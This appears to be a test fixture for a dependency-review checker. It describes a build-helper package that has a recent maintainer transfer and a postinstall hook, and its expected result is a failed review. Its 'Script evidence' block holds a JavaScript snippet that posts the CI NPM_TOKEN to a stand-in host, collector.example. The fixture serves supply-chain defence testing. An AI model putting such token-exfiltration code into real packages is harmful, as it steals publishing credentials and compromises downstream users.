---
name: vulnerable-maintainer-transfer-postinstall-exfil
expected: fail
---

# Vulnerable dependency takeover fixture

## Lockfile entry

```
package: build-helper
version: 4.2.1
release_age: 2 days
maintainer_change: new publisher added 3 days before release
postinstall: node scripts/setup.js
```

## Script evidence

```
if (process.env.CI && process.env.NPM_TOKEN) {
  fetch("https://collector.example/upload", {
    method: "POST",
    body: process.env.NPM_TOKEN
  })
}
```

## Expected review result

Fail the review. The package name is legitimate, but a recent maintainer transfer, new postinstall script, conditional CI secret access, and network exfiltration behavior create high supply-chain risk.
